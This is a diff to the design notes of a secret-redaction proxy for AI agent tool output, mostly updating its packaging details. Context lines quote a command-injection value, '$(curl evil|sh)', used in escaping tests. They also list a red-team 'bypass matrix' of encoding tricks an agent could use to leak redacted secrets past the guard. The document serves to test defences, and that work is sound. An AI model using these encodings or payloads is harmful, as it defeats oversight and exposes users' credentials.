@@ -109,7 +109,7 @@ scanner: each real value is escaped for where its token sits — unquoted (`shle
 `'` doubled, then shell-escaped). A seeded name like `$(curl evil|sh)` or `O'Brien` stays data.
 Without this, 23 of 35 injection tests fail.
 
-**Bypass matrix (`python -m veil.redteam`, regression-tested):** 20 one-command transforms an agent can
+**Bypass matrix (`python -m veil_dev.redteam`, regression-tested):** 20 one-command transforms an agent can
 apply (octal/hex/base64 dumps, repr/JSON escapes, rev, rot13, upper-casing, one char per line, spaced
 letters, `cut` mid-value, SQL `hex()`/`upper()`/`replace()`/`substr()`/`unicode()`, URL-encoding). All 20
 contained: byte dumps blocked by command policy; the guard withholds message content whose
@@ -213,9 +213,14 @@ container: pip-installed wheel, GNOME Keyring via `dbus-run-session`, `systemd-a
 
 ## Packaging
 
-Core deps: httpx, cryptography, pyahocorasick. Extras: `postgres`, `mysql`, `mongo`, `redis`,
-`bedrock`, `ner`, `all`. Console scripts `veil`, `veil-hook`. Wheel 93 KB; sdist 97 KB. Homebrew formula
-generated from `uv.lock` (uses Homebrew's `cryptography`; `service do` block for `brew services`).
+Distribution `veil-proxy` on PyPI. Core deps: httpx, cryptography, pyahocorasick. Extras: `postgres`,
+`mysql`, `mongo`, `redis`, `bedrock`, `ner`, `all`. Console scripts `veil`, `veil-hook`. Build backend
+`flit_core` (pure Python): Homebrew builds from source, and `uv_build`'s own source build needs maturin
+plus a Rust toolchain. Only `veil/` is packaged; the dev harness lives in `veil_dev/`. The Homebrew
+formula (tap `lemonadesaltbagel/homebrew-veil`) is generated from `uv.lock` plus the PyPI sdist
+(`scripts/gen_brew_formula.py`). It depends on Homebrew's `cryptography` and on a matching
+`python@3.x`, since that formula is only built for some Python versions. A `service do` block provides
+`brew services`.
 
 ## Hook mode
 `veil hook post` → `updatedToolOutput` with every string redacted (keeps the tool's output shape).
